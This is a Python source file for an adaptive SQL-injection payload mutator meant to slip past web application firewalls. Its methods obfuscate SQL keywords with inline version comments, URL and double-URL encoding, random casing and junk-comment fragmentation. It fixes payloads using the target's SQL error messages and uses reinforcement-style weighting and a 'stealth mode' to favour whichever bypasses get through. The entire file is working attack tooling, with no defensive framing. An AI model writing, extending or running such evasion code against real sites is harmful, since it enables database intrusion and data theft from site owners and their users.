import random
import re

class ASTMutator:
    def __init__(self, context="GENERIC"):
        self.sql_keywords = ["UNION", "SELECT", "OR", "AND", "WHERE", "ORDER BY", "SLEEP", "GROUP BY", "FROM", "INFORMATION_SCHEMA"]
        self.context = context
        # RL: Epsilon-Greedy parameters
        self.epsilon = 0.2  # Exploration rate
        self.strategies = {
            "logical_alts": self._logical_equivalents,
            "inline_comments": self._inline_version_comments,
            "union_balance": self._balance_union_columns,
            "junk_fill": self._junk_filling,
            "context_aware": self._context_aware_mutation,
            "directed_bypass": self._directed_keyword_mutation,
            "micro_fragmentation": self._micro_fragmentation,
            "nested_encoding": self._nested_encoding,
            "dynamic_structural": self._dynamic_structural_mutation
        }
        # Awareness: Track success of each strategy (Q-values)
        self.strategy_weights = {name: 1.0 for name in self.strategies.keys()}
        # Gene Credit Assignment: Track reputation of each keyword
        self.keyword_reputation = {kw: 1.0 for kw in self.sql_keywords}
        self.last_strategy_used = None
        self.stealth_mode = False

    def apply_hint(self, hint):
        """Applies AI-driven hints to strategy weights."""
        strategy = hint.get("strategy")
        if strategy in self.strategy_weights:
            self.strategy_weights[strategy] *= 5.0
            print(f"[*] Mutator: AI Hint Applied - Boosting {strategy}", flush=True)
        
        # Keyword specific hints
        target_kw = hint.get("target_keyword")
        if target_kw in self.keyword_reputation:
            self.keyword_reputation[target_kw] = 0.1 # Force bypass for this keyword
            print(f"[*] Mutator: AI Hint Applied - Flagging {target_kw} for bypass", flush=True)

    def mutate(self, payload, error_msg=None, intensity=1):
        mutated = str(payload)
        
        # 1. Error-Based Feedback: Apply specific fixes based on SQL error
        if error_msg:
            mutated = self._apply_error_feedback(mutated, error_msg)
            
        # 2. Context-Aware Mutation: Detect and wrap payload if needed
        mutated = self._context_aware_wrap(mutated)
        
        # 3. Standard Mutations with RL (Epsilon-Greedy)
        num_mutations = random.randint(1, 2) * intensity
        
        for _ in range(num_mutations):
            names = list(self.strategies.keys())
            
            # Epsilon-Greedy Selection
            if random.random() < self.epsilon:
                # Explore: Random choice
                strat_name = random.choice(names)
            else:
                # Exploit: Best performing strategy
                current_weights = dict(self.strategy_weights)
                if self.stealth_mode:
                    current_weights["dynamic_structural"] *= 2.0
                    current_weights["micro_fragmentation"] *= 2.0
                
                weights = [current_weights.get(n, 1.0) for n in names]
                strat_name = random.choices(names, weights=weights, k=1)[0]
            
            self.last_strategy_used = strat_name
            mutated = self.strategies[strat_name](mutated)
            
        return mutated

    def report_success(self, payload, score):
        """Gene Credit Assignment: Update strategy and keyword reputation based on score."""
        # Detect if we are being blocked consistently
        if score <= 0.1:
            self.stealth_mode = True
            # Penalize keywords present in a blocked payload
            for kw in self.sql_keywords:
                if kw in payload.upper():
                    self.keyword_reputation[kw] -= 0.1
                    self.keyword_reputation[kw] = max(0.1, self.keyword_reputation[kw])
        else:
            self.stealth_mode = False
            # Reward keywords in a successful payload
            if score > 0.5:
                for kw in self.sql_keywords:
                    if kw in payload.upper():
                        self.keyword_reputation[kw] += 0.05
                        self.keyword_reputation[kw] = min(2.0, self.keyword_reputation[kw])

        if self.last_strategy_used and score > 0.5:
            # Reward the strategy
            if self.last_strategy_used not in self.strategy_weights:
                self.strategy_weights[self.last_strategy_used] = 1.0
            
            self.strategy_weights[self.last_strategy_used] += 0.1
            # Normalize to prevent runaway weights
            total = sum(self.strategy_weights.values())
            for k in self.strategy_weights:
                self.strategy_weights[k] /= total
                self.strategy_weights[k] *= len(self.strategy_weights) # Keep average at 1.0

    def _directed_keyword_mutation(self, payload):
        """Directed Mutations: Apply bypasses to keywords based on their reputation."""
        mutated = payload
        # Find keywords with low reputation in the current payload
        for kw, rep in self.keyword_reputation.items():
            if kw in mutated.upper() and (rep < 0.8 or random.random() < 0.3):
                # Apply a bypass transformation
                bypasses = [
                    lambda k: f"{k[:len(k)//2]}/**/{k[len(k)//2:]}",
                    lambda k: f"/*!{k}*/",
                    lambda k: "".join([f"%{ord(c):02X}" if random.random() < 0.3 else c for c in k]),
                    lambda k: f"({k})" if k in ["SELECT", "UNION"] else k
                ]
                transform = random.choice(bypasses)
                # Use regex to replace keyword while preserving case if possible
                mutated = re.sub(rf'\b{kw}\b', transform(kw), mutated, flags=re.IGNORECASE)
        return mutated

    def _apply_error_feedback(self, payload, error):
        """Applies specific mutations based on SQL error messages."""
        error = error.lower()
        # Column count mismatch
        if "column" in error and ("count" in error or "match" in error):
            if "UNION SELECT" in payload.upper():
                # Add more columns to UNION
                parts = re.split(r"(SELECT\s+)", payload, flags=re.IGNORECASE)
                if len(parts) >= 3:
                    cols = parts[2].split(",")
                    cols.append("NULL")
                    return f"{parts[0]}{parts[1]}{','.join(cols)}"
        
        # Quote mismatch or syntax error near quote
        if "syntax" in error and ("'" in error or '"' in error):
            if "'" in payload: return payload.replace("'", "''")
            
        return payload

    def _context_aware_wrap(self, payload):
        """Wraps payload based on detected context (quotes, brackets)."""
        if random.random() > 0.7:
            wrappers = [
                ("'", "'"),
                ('"', '"'),
                ("') ", " --"),
                ('") ', " --"),
                (")) ", " --")
            ]
            prefix, suffix = random.choice(wrappers)
            if not payload.startswith(prefix):
                return prefix + payload + suffix
        return payload

    def _inline_version_comments(self, payload):
        mutated = payload
        for kw in self.sql_keywords:
            if kw in mutated.upper():
                rand_ver = random.randint(40000, 60000)
                mutated = re.sub(rf'\b{kw}\b', f"/*!{rand_ver}{kw}*/", mutated, flags=re.IGNORECASE)
        return mutated

    def _logical_equivalents(self, payload):
        equivalents = {
            r"1=1": ["true", "not false", "~0=~0", "8<=>8"],
            r"\bOR\b": ["||", "XOR"],
            r"\bAND\b": ["&&"]
        }
        mutated = payload
        for pattern, alts in equivalents.items():
            mutated = re.sub(pattern, random.choice(alts), mutated, flags=re.IGNORECASE)
        return mutated

    def _balance_union_columns(self, payload):
        if "UNION" in payload.upper() and "SELECT" in payload.upper():
            column_options = ["NULL", "NULL,NULL", "NULL,NULL,NULL", "1,2", "database(),user()"]
            parts = re.split(r"(SELECT\s+)", payload, maxsplit=1, flags=re.IGNORECASE)
            if len(parts) >= 3:
                return f"{parts[0]}{parts[1]}{random.choice(column_options)}"
        return payload

    def _junk_filling(self, payload):
        junk = ["bypass", "attack_unit", "audit"]
        if "/**/" in payload:
            return payload.replace("/**/", f"/*{random.choice(junk)}*/")
        return payload

    def _context_aware_mutation(self, payload):
        mutated = str(payload)
        
        # 0. Context-Specific Injection
        if self.context == "SINGLE_QUOTE" and not mutated.startswith("'"):
            mutated = "'" + mutated
        elif self.context == "DOUBLE_QUOTE" and not mutated.startswith('"'):
            mutated = '"' + mutated

        # 1. Quote Alteration: Swap quotes
        if "'" in mutated:
            if random.random() < 0.4:
                mutated = mutated.replace("'", '"')

        # 2. Comment Wrapping: Wrap keywords or parts of the payload
        keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY"]
        for kw in keywords:
            if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE):
                coin = random.random()
                if coin < 0.3:
                    mutated = re.sub(rf'\b{kw}\b', f"/**/{kw}/**/", mutated, flags=re.IGNORECASE)
                elif coin < 0.6:
                    mutated = re.sub(rf'\b{kw}\b', f"/*!{kw}*/", mutated, flags=re.IGNORECASE)

        # 3. Space/Separator Mutation
        if " " in mutated:
            separators = ["/**/", "/*!*/", "+"]
            sep = random.choice(separators)
            mutated = mutated.replace(" ", sep)

        return mutated

    def _micro_fragmentation(self, payload):
        """Micro-Fragmentation: Splits the payload into small chunks stuffed with junk data."""
        if len(payload) < 5: return payload
        
        # Split into 3-5 random chunks
        num_chunks = random.randint(3, 6)
        chunk_size = max(1, len(payload) // num_chunks)
        chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
        
        junk_patterns = [
            "/**/", "/*" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=4)) + "*/",
            "/*!*/", "/**/--/**/", " "
        ]
        
        fragmented = ""
        for i, chunk in enumerate(chunks):
            fragmented += chunk
            if i < len(chunks) - 1:
                fragmented += random.choice(junk_patterns)
        
        return fragmented

    def _nested_encoding(self, payload):
        """Nested Encoding: Applies layers of encoding (URL, Hex, etc.) to parts of the payload."""
        import base64
        
        def to_hex(s):
            return "".join([f"0x{ord(c):02x}" for c in s])
            
        def to_url(s):
            return "".join([f"%{ord(c):02x}" for c in s])

        # Only encode keywords or specific parts to avoid breaking SQL syntax entirely
        mutated = payload
        for kw in self.sql_keywords:
            if kw in mutated.upper() and random.random() < 0.4:
                # Pick a random encoding strategy
                enc_type = random.choice(["hex", "url", "double_url", "mixed"])
                
                if enc_type == "hex" and kw in ["SELECT", "UNION"]:
                    # Hex is risky for keywords, maybe just for strings? 
                    # Let's keep it simple for now
                    continue 
                
                if enc_type == "url":
                    mutated = re.sub(rf'\b{kw}\b', to_url(kw), mutated, flags=re.IGNORECASE)
                elif enc_type == "double_url":
                    mutated = re.sub(rf'\b{kw}\b', to_url(to_url(kw)), mutated, flags=re.IGNORECASE)
                elif enc_type == "mixed":
                    # Partial URL encoding
                    encoded_kw = "".join([to_url(c) if random.random() < 0.5 else c for c in kw])
                    mutated = re.sub(rf'\b{kw}\b', encoded_kw, mutated, flags=re.IGNORECASE)
                    
        return mutated

    def _dynamic_structural_mutation(self, payload):
        """Dynamic Structural Mutation: Avoids mechanical substitution by generating unique bypass patterns."""
        mutated = payload
        
        # 1. Dynamic Comment Injection (Non-standard patterns)
        def get_dynamic_comment():
            chars = "abcdefghijklmnopqrstuvwxyz0123456789"
            content = "".join(random.choices(chars, k=random.randint(2, 5)))
            patterns = [
                f"/**/", 
                f"/*{content}*/", 
                f"/*!{content}*/", 
                f"/*--{content}*/",
                f"/*#*/"
            ]
            return random.choice(patterns)

        # 2. Case Randomization (Bypasses simple regex)
        def randomize_case(word):
            return "".join([c.upper() if random.random() > 0.5 else c.lower() for c in word])

        # Apply to keywords
        for kw in self.sql_keywords:
            if kw in mutated.upper():
                # Don't just replace, mutate the structure
                options = [
                    lambda k: f"{randomize_case(k)}",
                    lambda k: f"{get_dynamic_comment()}{k}{get_dynamic_comment()}",
                    lambda k: k.replace(" ", get_dynamic_comment()),
                    lambda k: "".join([c + get_dynamic_comment() if random.random() < 0.3 else c for c in k])
                ]
                mutated = re.sub(rf'\b{kw}\b', random.choice(options)(kw), mutated, flags=re.IGNORECASE)
        
        return mutated
